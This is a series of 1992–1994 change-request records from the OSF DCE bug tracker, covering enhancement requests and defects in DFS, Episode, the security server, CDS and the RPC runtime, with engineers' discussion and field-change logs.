Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : glue
Short Description             : Need make mount point syscall
Reported Date                 : 6/9/92
Found in Baseline             : 1.0.1
Found Date                    : 6/9/92
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : mason@transarc.com
Transarc Status               : open

[6/9/92 public]
DFS mount points can only be made/examined via the DFS cache manager.
fts mkmount uses the symlink call to make the mount point, and the
cache manager special cases symlinks beginning with #, $, or % and
turns them into mount points (flagged by having no executable bits
set on the mount point itself).

The implications of this are that (1) symbolic links cannot be created
via dfs that start with #, $, or %, and (2) clients of an LFS cannot
directly create a mount point without accessing the file system through
DFS.

The AFS syscall that implements stat'ing and removal of DFS mount points
should be extended to handle mount point creation, and it should be
implemented using the extended vnode ops, rather than being specific to
the cache manager.

Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[6/16/92 public]
Filled in Responsible Engr. with `pakhtar@transarc.com' 
Filled in Resp. Engr's Company with `tarc'

[6/18/92 public]
Changed Interest List CC from `cfe@transarc.com kazar@transarc.com 
 bob@transarc.com' to `cfe@transarc.com pakhtar@transarc.com bob@transarc.com' 
Changed Responsible Engr. from `pakhtar@transarc.com' to `kazar@transarc.com'

[9/2/92 public]
Didn't remember that this was a conversion issue.
Changed Interest List CC from `cfe@transarc.com pakhtar@transarc.com 
 bob@transarc.com' to `cfe@transarc.com, pakhtar@transarc.com, 
 bob@transarc.com'

[9/3/92 public]
The DFS syscall that implements reading and deleting of DFS mount points
is just pioctl(), and that indeed uses DFS (being specific to the CM).

One substantial piece of motivation for this request is to allow mount points
to be created by entities other than the DFS CM.  This is unusual, since
those mount points are not interpreted by entities other than the DFS CM.
Even if one wanted to use other mechanisms for writing into filesets (such
as writing into locally-mounted UFS or LFS filesets), one could use DFS to
create the mount points themselves.

I recommend that this defect be cancelled, since it is an enhancement that
we are unlikely to get to.

[9/11/92 public]
change priority
Changed Priority from `2' to `3'

[10/14/92 public]
Changed Interest List CC from `cfe@transarc.com, pakhtar@transarc.com, 
 bob@transarc.com' to `cfe@transarc.com, pakhtar@transarc.com, 
 bob@transarc.com,demail1!carl'



CR Number                     : 4062
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : acl_edit
Short Description             : Some suggestions for usability.
Reported Date                 : 6/4/92
Found in Baseline             : 1.0.1b17
Found Date                    : 6/4/92
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : mason@transarc.com
Transarc Status               : open

[6/4/92 public]

I would like to make the following suggestions for enhancing the usability
of the acl_edit command.

1)  Make it more UNIX like and put the options prior to the object that 
    acl_edit is to act upon.

2)  Remove the #'s from the output.

3)  My understanding is that to modify an ACL I need to go into the
    interactive mode.  This is very painful.

This command will have a usage pattern similar to the ls -l command.  Given
that, the current interface seems insufficient.  Users will be using this
command in admin scripts and such, so making the interface more usable,
as quickly as possible would be a benefit to such users.

Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[6/4/92 public]
> 1) Make it more UNIX like
Maybe.  It was designed around early POSIX drafts and there may be a way to
make it more unix like, but it's perfectly usable as it is.

> 2) Remove the #'s from the output.
No.  These denote non-data (except for the cellname, which is an unfortunate
exception).  The data portion of the output can be used as input to acl_edit
through the -f option (or the interactive 'assign' command).  So, you can run
acl_edit and redirect output to a file, run it again using the -f option with
that filename, and effectively copy an acl from one object to another.

> 3) Must use interactive mode
Who gave you this idea???  Interactive mode is a secondary feature which we
put there to make it easier on users to do certain things.  If you don't like
it don't use it.  All commands are available on the command line.  Transarc
must have a copy of the documentation there, and I know the docs on acl_edit
explain what each command line option does (although the 1.0.1 doc is much
better).  Take a look at dce_config, it modifies acls all over the place and
never goes into interactive mode.

I've marked this as 'defer', since no new functionality will be added to
any DCE component before 1.0.1 is out the door.

[6/5/92 public]

>> 2) Remove the #'s from the output.
>No.  These denote non-data (except for the cellname, which is an unfortunate
>exception).  The data portion of the output can be used as input to acl_edit
>through the -f option (or the interactive 'assign' command).  So, you can run
>acl_edit and redirect output to a file, run it again using the -f option with
>that filename, and effectively copy an acl from one object to another.

This sounds like a nice feature, but I don't think it should be the default
behavior.  I wold prefer if I could contorl this output via an option.

One other thing that I think would be useful is for acl_edit to indicate
if the ACL it prints is real, or contrived from the mode bits.  I know that
the two are to be kept in sync and changes to one affect the other, but
if I were an administrator I think I would want to know when I was looking at 
real ACL's versus an interpretation of the mode bits.

[6/5/92 public]

The use of '#' is in keeping with the draft posix specification.  Posix
stipulates that the effective access rights (after masking) are supposed
to be output after a '#' character.  In addition Posix mandates that the 
standard output format of an ACL (as emitted by editors or lsacl) contain
several lines that begin with '#' that identify the object protected by the
acl.

Given that we want to conform to POSIX, we cannot change the default behavior.
It is possible that we will add options in the future to provide an alternate
output format, but this will be low priority.

[6/5/92 public]
To reiterate my position on this CR:
> 1) More Unix like
I'll look into the command line syntax *after* 1.0.1 to see if I can't
make it more tolerant of UNIX behavior, without breaking any current possible
usage.  That's all I'll do in that area.

> 2) #'s
This is *not* going to change, unless POSIX changes their mind (see Joe's note)

> 3) Must use interactive mode
Just plain wrong.

> 4) Indicate if the ACL is real or contrived from mode bits.
HUH?  I don't think you understand what the DCE ACL architecture is.  Maybe
internal to DFS you can tell how an ACL came about but the DCE ACL architecture
the API, acl_edit, the wire interface ... are *not* designed around the DFS
acls.  There is a conversion layer that lets you manipulate DFS acls via the
DCE ACL API.  This indication of how the ACL was generated will not be a part
of the DCE ACL architecture anytime soon.  If you feel strongly enough about
it, and can convince OSF that it's necessary and that there's a way to do it
that isn't catering to DFS (ie: generic enough that any DCE ACL manager can
do something with it) then somebody may think about doing it for DCE2.0 or
beyond.



CR Number                     : 4021
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : gda
Short Description             : gdad should be able to make multiple DNS queries to resolve cell.
Reported Date                 : 6/3/92
Found in Baseline             : 1.0.1b18
Found Date                    : 6/3/92
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[6/3/92 public]

Currently, the gda requires that the response from the DNS nameserver
contain both a TXT record for the cell root information, plus an additional
"A" record for the cell's root server.

To do this, you have to fake DNS into piggybacking the "A" record into the
response by adding an MX record for the cell pointing to its servers.

This is a kludge, especially since the cell servers may not be running a
mailer.

If the response from DNS does not contain additional records with the name
and address of all the cell's servers, the gda should make one or more
additional DNS queries with type=A to obtain the addresses of the servers.

Just call gethostbyname if you're lazy.

[6/2/92 public]
The original plan, conceived with Craig Everhart, is to use AFSDB records
to refer to the servers by name. These are like MX records in that the
hostname causes named to return the A record in the answer. Unfortunately
(as stated in the documentation) most named's do not support AFSDB
records, so MX records can be used in their stead, kludge though it
may be.

The gdad does not call gethostbyname because it is not thread safe. Rather
than single-threading its way through the resolver code (not thread safe
either), the gdad issues requests to DNS servers in parallel. I've
discussed this with Nat Mishkin and he has come close to convincing me
that this is not a good enough reason for not using the resolver (after
hacking it to be thread reentrant). The other reason for not using the
resolver is that it, I believe, cannot handle referrals and therefore
cannot talk to the DNS root servers who refuse to chain requests.

[10/12/92 public]

Changed to DEFER.  Mark F is doing significant redesign on the DNS cellname
representation.  That design will likely make this OT moot.



CR Number                     : 3822
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : lfs
Short Description             : An I/O error that causes a panic in logbuf/buffer.c
Reported Date                 : 5/26/92
Found in Baseline             : 1.0.1
Found Date                    : 5/26/92
Severity                      : A
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : mason-ot3822-handle-io-errors-better
Transarc Herder               : jaffe@transarc.com
Transarc Status               : open
Transarc Delta                : 

[5/26/92 public]
This is  tr # 2627.
ate: Thu, 12 Mar 1992 15:57:54 -0500 (EST)
From: Bruce_Leverett@transarc.com
To: DFS_Bugs_Mailing-List@transarc.com
Subject: new bug
Cc:
This is an Episode bug.  It should have high severity.
In several places in episode/logbuf/buffer.c, we assert that the return value
from WaitForWrite (or the out-parameter set by asevent_WaitEvent) is zero.
This has the effect that an I/O error causes a panic.  This can happen
regardless of whether the buffer was data or meta-data, whether it was being
read or written, and who was using the buffer.  We must recover more
gracefully from I/O errors.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[7/20/92 public]
Changed "Fix by" to 1.0.2

[8/24/92 public]
Changed Defect or Enhancement? from `enh' to `def'

[10/1/92 public]
I've started to build some tools to do this.  I'm suggesting a zero-th
order round where we make sure that non-meta data errors do not cause
the system to panic.  When that is done, close this OT and open
another one which describes better error handling in the meta-data
case.
Changed Responsible Engr. from `bwl@transarc.com' to `mason@transarc.com' 
Filled in Transarc Deltas with `mason-ot3822-handle-io-errors-better' 
Changed Transarc Herder from `mason@transarc.com' to `jaffe@transarc.com'

[10/19/92 public]
Ted's comment on this one (and I agree) is that we need to do some initial
work on this, but this defect is very large and very general.  After some
preliminary work, I'll generate some more specific defects and close this
one.

[10/27/92 public]
Upgrade priority due to age.
Changed Priority from `2' to `1'

[11/16/92 public]
While it is a very desirable enhancement, an enhancement it is.
Changed Defect or Enhancement? from `def' to `enh' 
Filled in Interest List CC with `ota'

[11/15/93 public]
Changed Responsible Engr. from `mason@transarc.com' to `ota@transarc.com' 
Added field Transarc Delta with value `'



CR Number                     : 3821
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : EPISODE
Short Description             : Use icl to report error code mapping in efs_agops.c
Reported Date                 : 5/26/92
Found in Baseline             : 1.0.1
Found Date                    : 5/26/92
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com
Transarc Status               : open

[5/26/92 public]
This is tr #2621.
Date: Mon,  9 Mar 1992 08:41:12 -0500 (EST)
From: Ted_Anderson@transarc.com
To: DFS_Bugs_Mailing-List@transarc.com
Subject: Need error code tracing in efs_agops.c
CC: Bruce_Leverett@transarc.com
The file episode/vnops/efs_agops.c has only a single call to
EFS_TRACE_VNOPS yet there are many cases where error codes are being
mapped.  Especially note that failures from epig_InitAggregate are being
mapped silently.  The file needs to be checked for all error code
mapping and a trace entry added to each.
 [Please assign this to Bruce.]
Ted
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[7/20/92 public]
Changed "Fix by" to 1.0.2

[8/25/92 public]
Assigned to Elliot.
Changed Responsible Engr. from `bwl@transarc.com' to `jaffe@transarc.com' 
Added field ffected File with value `'

[9/1/92 public]
Notice how strange Tony's change lines are, particularly the Transarc Status, which is currently ``open\nffected File(s) :''

[9/18/92 public]

[9/21/92 public]
Changed Defect or Enhancement? from `def' to `enh'

[10/8/92 public]

[10/8/92 public]
I cannot tell which calls might return episode errcodes. Bruce has expressed
a willingness to fix this enhancment, thus it is his.
Changed Responsible Engr. from `jaffe@transarc.com' to `bwl@transarc.com' 
Changed Transarc Herder from `mason@transarc.com' to `jaffe@transarc.com'

[11/11/93 public]
Changed Subcomponent Name from `lfs' to `EPISODE' 
Changed Short Description from `efs_agops.c needs more error checking.' to `Use 
 icl to report error code mapping in efs_agops.c' 
Filled in Reported by Company's Ref. Number with `2621'



CR Number                     : 3820
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 5316
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : aix
Component Name                : dfs
Subcomponent Name             : EPISODE
Short Description             : Waitall code is inherently broken
Reported Date                 : 5/26/92
Found in Baseline             : 1.0.1
Found Date                    : 5/26/92
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com
Transarc Status               : open

[5/26/92 public]
The event set code is inherently broken because an event can be part of
only one set.  This causes higher layers to effectively not use event
sets (see the code in HandleLogFull and elbb_FsyncForce in
logbuf/buffer.c for examples).
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[5/27/92 public]
Filled in Reported by Company's Ref. Number with `2572'

[7/20/92 public]
Changed "Fix by" to 1.0.2

[8/25/92 public]
Assigned to Elliot.
Filled in Interest List CC with `bwl@transarc.com' 
Changed Responsible Engr. from `bwl@transarc.com' to `jaffe@transarc.com' 
Changed Transarc Herder from `mason@transarc.com' to `jaffe@transarc.com'

[8/25/92 public]
I did not mean to assign this to Elliot.  Reassigned.  As per Bruce's note,
I'm marking this as an enhancement request.
Changed Defect or Enhancement? from `def' to `enh' 
Changed Responsible Engr. from `jaffe@transarc.com' to `bwl@transarc.com'

[9/2/92 public]
Another partial fix suggested in OT 5316.
Filled in Inter-dependent CRs with `5316'

[11/11/93 public]
Changed Subcomponent Name from `lfs' to `EPISODE' 
Changed Short Description from `Waitall code is inherently broken.' to `Waitall 
 code is inherently broken'



CR Number                     : 3819
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : secd
Short Description             : need to avoid uninitialized output arguments
Reported Date                 : 5/26/92
Found in Baseline             : 1.0.1
Found Date                    : 5/26/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[5/26/92 public]

Someone (me?) needs to make a pass through all the remoted routines
exported by secd and ensure that all output arguments are initialized to
known, "safe" values in all paths through the manager routines; otherwise,
one might be able to pick up interesting and useful encryption keys out of
"stack garbage".

Exploiting this "feature" is inherantly machine-dependant, but is likely to
be possible on most systems.

I suspect the appropriate thing to do is add a bunch of "memset()" calls in
appropriate places.

The only one I'm sure of is secd's implementation of the rsecidmap
interface.

[6/24/92 public]

I've fixed the one case I'm sure of, but still need to through the rest of
them.

[10/19/92 public]

OT cleanup 1 : Severity = unchanged(C)  ;  Priority = unchanged (2)

[1/4/93 public]
Changed priority to 3 since this is a cleanup activity that no one
is waiting for and with no real known cases that need fixing.

[10/13/93 public]

changed to enhancement.



CR Number                     : 3813
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 4553
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : lfs
Short Description             : Manage transaction sizes better.
Reported Date                 : 5/26/92
Found in Baseline             : 1.0.1
Found Date                    : 5/26/92
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com
Transarc Status               : open

[5/26/92 public]
This is tr defect #2338.

We need to do a better job of managing transaction sizes.

1. Measure transaction sizes: for each transaction name (which are
   one-to-one with calls to epia_StartTran) track average and max size.

2. Select an small upper-bound for the default transaction size that
   will handle most common transactions yet be small enough to allow
   good concurrency.  Some thing like 1-2Kb would be nice.

3. Large transactions should started explicitly with an upper-bound.

Some areas clearly need investigation:

From the anode/bug-report.text file:

xxxxxx 0054 ota

Currently the code in volume_table.c in FindLastIndex attempts to reduce
the size of the volume table by up to five pages at a time.  This is
probably still too many.  Since we have to call Deflate anyway, we
might as well take a conservative approach here. -ota 910419

xxxxxx 177 ota

The epif_Create code will copy auxiliary containers if they are from
other volumes.  This is all done under the same transaction that is used
for the Create.  Since both the acl and the plist could be 8K this
effectively doubles the size of the largest transaction.

( Discovered -ota 911121 )

There are others. -ota 920117
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[7/10/92 public]
Changed Subcomponent Name from `episode' to `lfs' 
Filled in Reported by Company's Ref. Number with `2338'

[7/20/92 public]
Changed "Fix by" to 1.0.2

[7/31/92 public]
Restoring a fileset writes data to directories in more or less random blobs.
Each call to vol_efsWrite is done in its own transaction but there is no limit
on the size of these transfers.  There should be a stated limit of 8K for
meta-data objects like directories.
Filled in Inter-dependent CRs with `4553'

[8/31/92 public]
This is part of log-full avoidance.

Filled in Interest List CC with `mason@transarc.com' 
Changed Responsible Engr. from `mason@transarc.com' to `rajesh@transarc.com' 
Changed Transarc Herder from `mason@transarc.com' to `jaffe@transarc.com'

[10/27/92 public]
 Upgraded priority due to age.  If Rajesh does not have time to fix
this, perhaps Bruce or Jeff can.

Changed Interest List CC from `mason@transarc.com' to `mason,bwl,jdp' 
Changed Priority from `3' to `1'

[1/15/93 public]
The most important part of this work has been completed and submitted
under other OT numbers.  What remains is a lower priority enhancement,
so I am changing the defect accordingly.
Changed Defect or Enhancement? from `def' to `enh' 
Changed Priority from `1' to `3'



CR Number                     : 3812
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : lfs
Short Description             : Consistency checks in fixed_anode.c should be assertions.
Reported Date                 : 5/26/92
Found in Baseline             : 1.0.1
Found Date                    : 5/26/92
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : mason@transarc.com
Transarc Status               : open

[5/26/92 public]
This is tr defect #2636.
Date: Fri, 20 Mar 1992 17:07:32 -0500 (EST)
From: Bruce_Leverett@transarc.com
To: DFS_Bugs_Mailing-List@transarc.com

The following consistency checks in episode/anode/fixed_anode.c should be
assertions.  Line numbers are from version 2.8 of the file, so beware:

1934   2439   3414
1937   2444   3443
1997   2470   3447
2087   3176   3589
2088   3178   3646
2089   3295   3647
2144   3307   3819
2174   3350   4123
2270   3362   4803

Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[7/9/92 public]
Changed Subcomponent Name from `episode' to `lfs' 
Filled in Reported by Company's Ref. Number with `2636'

[7/20/92 public]
Changed "Fix by" to 1.0.2



CR Number                     : 3809
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 3802
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : lfs
Short Description             : Add TLOCK to volume_table module
Reported Date                 : 5/26/92
Found in Baseline             : 1.0.1
Found Date                    : 5/26/92
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : mason@transarc.com
Transarc Status               : open

[jess@transarc.com 5/26/92 public] This is transarc defect #2568.  The
volume_table module, contrary to the current commentary present there,
should have a tlock to mediate anode allocate/deallocate and page
creation/truncation.  This is the primary case of tlock granularity
overlay and it is not being handled properly.  Currently the volume
tlock is responsible for this function but that tlock should be
restricted to the fileset header and a separate tlock should be added to
the volume_table module to handle this critical case.

This fix will also fix bug tr2385/ot3802 (epit_Deflate doesn't use
any tlock)

Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[7/10/92 public]
Filled in Inter-dependent CRs with `3803' 
Changed Subcomponent Name from `episode' to `lfs' 
Filled in Reported by Company's Ref. Number with `2568'

[7/20/92 public]
Changed "Fix by" to 1.0.2

[9/25/92 public]
Changed Inter-dependent CRs from `3803' to `3802' 
Filled in Interest List CC with `ota@transarc.com' 
Changed Responsible Engr. from `ota@transarc.com' to `blake@transarc.com'



CR Number                     : 3807
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : lfs
Short Description             : Split AUX container code into separate module.
Reported Date                 : 5/26/92
Found in Baseline             : 1.0.1
Found Date                    : 5/26/92
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : mason@transarc.com
Transarc Status               : open

[5/26/92 public]
This is the transarc defect #2567.

The code for managing auxiliary containers in located in the file module
but has very little dependence on the rest of that code and could
profitably be separated into another module.

Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[7/10/92 public]
Changed Subcomponent Name from `episode' to `lfs' 
Filled in Reported by Company's Ref. Number with `2567'

[7/20/92 public]
Changed "Fix by" to 1.0.2



CR Number                     : 3777
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : rpc
Subcomponent Name             : runtime
Short Description             : com.h NAF id table mismatch with socket.h
Reported Date                 : 5/25/92
Found in Baseline             : 1.0
Found Date                    : 5/25/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[5/25/92 public]
from runtime/com.h:
  #define rpc_c_naf_id_osi     19

from sys/socket.h:
  #define AF_ISO          7               /* ISO protocols */
  #define AF_OSI          AF_ISO
  ...
  #define pseudo_AF_XTP   19              /* eXpress Transfer Protocol (no AF) */

from runtime/com.h:
  #define rpc_c_naf_id_max     20

from sys/socket.h:
  #define AF_MAX          30

[5/29/92 public]
Changed to "enhancement"; the issue is pretty moot given that we don't
really support the ISO address/protocol family at the moment.

In any case, it's not clear we really have a bug here anyway since I could
argue that the space of rpc_c_naf_id_... values is really different from
the space of AF_... values.  They happen to look the same and the fact that
they are at the moment is of some utility to the implementation of the
rpc_socket_... and rpc_naf_... abstractions.  At the point where some ISO
stack gets supported, we can either change the value of rpc_c_naf_id_osi
(should we be so lucky that the world converges on a single value of
AF_ISO) or we could fix the implementations of the rpc_socket_... and
rpc_naf_... abstractions to do the appropriate mapping for the local
system.

[07/20/93 public]
See mishkin's comments above, the inter to rpc defined do not
correspond to the socket defines.

Canceled.

[07/20/93 public]
Bill S. want to take a stab at this.



CR Number                     : 3753
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 3666
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : EPISODE
Short Description             : Superblock handling is inadequate
Reported Date                 : 5/22/92
Found in Baseline             : 1.0.1
Found Date                    : 5/22/92
Severity                      : D
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : jdp@transarc.com
Transarc Status               : open

[5/22/92 public]
Ideally we should improve the usefulness of superblocks.  Currently they
are only set when the aggregate is created.  This means that the
alternate superblocks do not contain any information about any of the
filesets that were created after the aggregate was initialized (namely,
all of them).  This makes the alternates pretty useless.  The plan of
record is to copy the primary superblock over the least recently updated
alternate superblock at aggregate shutdown time.
However, I question the alternate superblocks mechanism as a useful
source of redundancy.  I'm sure there are a few cases where having an
alternate superblock available will save someone a lot of work.  But I
doubt that this is a very important or interesting class of errors.  If
recovery is working, as it will be in a mature product, the primary need
for the salvager will be disk failures.  What fraction of these will
damage only the superblock yet leave other important parts of the disk
untouched?  Perhaps operator error (cat'ing a small file over the disk
device when running as root) is a more likely failure mode.
Anyway, tradition aside, I think time and effort will be better spent in
other areas.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `jdp@transarc.com' 
Added field Transarc Status with value `open'

[5/28/92 public]
Changed Fix By Baseline from `1.1' to `1.0.2'

[7/8/92 public]
Changed Defect or Enhancement? from `def' to `enh'

[1/24/94 public]
Changed Subcomponent Name from `lfs' to `EPISODE'



CR Number                     : 3637
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : secd
Short Description             : Need better error msg on acct add w/ bad caller passwd.
Reported Date                 : 5/18/92
Found in Baseline             : 1.0.1b14
Found Date                    : 5/18/92
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[5/18/92 public]

I have recently installed a dce cell and have been experimenting with
rgy_edit.
After going thru the litany of questions to add a new principal I got
the following error message:

?(rgy_edit) Unable to add "jec" - Data integrity error (dce / sec)

After playing around a bit more I figured it out - I had entered the
same password 3 times instead of entering the new password tweice and
the third time to enter the password of the account that I was
dce_login'ed as (in this case cell_admin).

The error message did nothing to indicate where the problem was. Is
this a feature or a (potential) slip?

[5/27/92 public]
Changed subcomponent to secd, since that's where the error is coming
from (rgy_edit can't know that there wasn't really a data integrity
problem, so it can't just replace the error message).  We're looking
into enhancing the password change code to be able to detect the incorrect
password case, to give a more usable error (there may still be a possibility
of getting this error if data integrity was not preserved over the wire).
Changed short description, so readers of summary reports will know what this
defect is really about.

[6/22/92 public]
Not likely to be done for 1.0.1, because it may also involve documentation
changes...



CR Number                     : 3604
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : lfs
Short Description             : Avoid confusing references to VR_ procedures in anode layer
Reported Date                 : 5/15/92
Found in Baseline             : 1.0.1
Found Date                    : 5/15/92
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : mason@transarc.com
Transarc Status               : open

[5/15/92 public]

The code in the anode layer: test_anode.c and aggregate.c makes confusing 
references to vr_ procedure that live in epia_volreg.c.  These are only used 
by the test code, however, they are actually linked into the kernel but 
never called.  The test code will need some mechanism to replace this but 
whatever it is should be more clearly test scaffolding.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[7/20/92 public]
Changed "Fix by" to 1.0.2



CR Number                     : 3537
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : cds
Subcomponent Name             : cds/includes/threads_lib.h
Short Description             : Calls to dthread_equal cause type mismatch compile errors.
Reported Date                 : 5/14/92
Found in Baseline             : 1.0
Found Date                    : 5/14/92
Severity                      : C
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[5/14/92 public]

Note that this is on MVS with the C/370 2.1 compiler.

        The following define of dthread_equal occurs in threads_lib.h
        if DTHREAD_WRAPPERS is not defined.

        #define dthread_equal           pthread_equal

        Some places in the CDS code call dthread_equal with parameters
        which are not of type pthread_t.  For example, the following
        call is made in cds/child/clerk_client.c

        if (!dthread_equal(ll_p->ll_mutex, dthread_null)) {

        ll_p->ll_mutex is of type pthread_mutex_t if DTHREAD_WRAPPERS
        is not defined.  Because dthread_equal is defined to be
        pthread_equal which expects both parameters to be of type
        pthread_t this line will result in a type mismatch compile
        error.

Repeat By:

        Compile the files which call dthread_equal with parameters that
        are not of type pthread_t, without defining DTHREAD_WRAPPERS,
        using the C/370 compiler on MVS.

Proposed Solution:

        The quick way to fix this problem is to change the definition of
        dthread_equal in threads_lib.h to:

        #define dthread_equal(handle1, handle2)  \
            pthread_equal((pthread_t)(handle1), (pthread_t)(handle2))

        However, the proper fix is to do the above change, plus replace
        all calls to dthread_equal that pass parameters which are of a
        type other than pthread_t, with some other function that
        compares pointers.

